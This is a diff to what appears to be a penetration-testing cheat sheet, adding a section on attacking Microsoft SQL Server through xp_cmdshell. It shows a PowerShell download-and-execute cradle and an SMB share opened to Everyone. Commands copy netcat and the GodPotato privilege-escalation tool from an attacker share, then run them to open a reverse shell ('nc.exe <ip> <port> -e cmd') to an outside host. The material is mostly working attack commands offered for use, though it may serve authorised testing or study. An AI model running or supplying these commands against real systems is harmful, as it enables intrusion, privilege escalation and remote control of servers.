@@ -129,6 +129,18 @@ xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://<IP
 ```
 - https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
 
+## Creating a share folder 
+-> SMB folder
+```powershell
+mkdir Temp
+New-SmbShare -Name share -Path C:\Temp -FullAccess Everyone
+```
+```bash
+EXEC xp_cmdshell 'copy \\<ip>\share\nc.exe C:\Temp\nc.exe'
+EXEC xp_cmdshell 'copy \\<ip>\share\GodPotato-NET4.exe C:\Temp\GodPotato-NET4.exe';
+EXEC xp_cmdshell 'C:\Temp\GodPotato-NET4.EXE -cmd "C:\Temp\nc.exe <ip> <port> -e cmd"';
+```
+
 ## Cross-Site Scripting
 1-> Identify the language and frameworks used  
 2-> Identify entry points (parameters, inputs, responses reflecting values you can control, etc)   
